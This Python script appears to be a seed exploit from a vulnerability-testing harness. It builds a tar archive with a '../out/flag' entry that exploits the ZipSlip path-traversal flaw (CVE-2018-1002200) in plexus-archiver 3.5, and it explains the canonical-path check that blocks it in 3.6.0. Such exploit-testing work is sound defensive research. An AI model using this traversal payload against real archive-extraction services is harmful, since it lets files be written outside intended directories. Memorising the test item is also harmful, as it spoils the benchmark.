#!/usr/bin/env python3
"""[GIVEN] CVE-2018-1002200 ZipSlip seed exploit for plexus-archiver-symlink-extraction-bypass.

The classic ZipSlip / archive-traversal vector: a tar entry whose name contains "../" so that, when
extracted, it is written OUTSIDE the destination directory. plexus-archiver's
AbstractUnArchiver.extractFile resolves each entry with `FileUtils.resolveFile(dir, entryName)`:

    entry name:  ../out/flag        (a plain regular-file entry, content = ${PCB_FLAG})
    dest dir:    /work/dest
    resolves to: /work/out/flag     (OUTSIDE /work/dest)

On V0 (plexus-archiver 3.5) extractFile has NO containment check -> the resolved path /work/out/flag is
written directly via `new FileOutputStream(f)` and the flag lands outside dest (REACHES). On V1
(3.6.0, CVE-2018-1002200 patched) extractFile adds
`if (!f.getCanonicalPath().startsWith(dir.getCanonicalPath())) throw ArchiverException(...)`, so the
"../" entry is rejected with "Entry is outside of the target directory (../out/flag)" and nothing is
written (BLOCKED). The block on V1 is specifically the guard the CVE-2018-1002200 fix added.

The flag is a per-run random ${PCB_FLAG} token; here it is the CONTENT the escaped write deposits at
the witness path /work/out/flag (state-write canary). The Driver reads that witness after extraction;
if it holds the token, containment was escaped.
"""
from __future__ import annotations

import base64
import io
import tarfile

# Escape witness: OUTSIDE the extraction dir /work/dest (see docker-compose.yml / Driver.java).
ESCAPE_ENTRY = "../out/flag"


def build_tar(flag: str) -> bytes:
    """A tar with a single plain regular-file entry whose name traverses out of dest via '../'."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        data = flag.encode("utf-8")
        ti = tarfile.TarInfo(ESCAPE_ENTRY)
        ti.size = len(data)
        ti.type = tarfile.REGTYPE
        t.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def candidate(flag: str):
    return {
        "id": "cve-2018-1002200-dotdot-zipslip",
        "tar_b64": base64.b64encode(build_tar(flag)).decode("ascii"),
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate("PCBFLAG_demo"), indent=2))
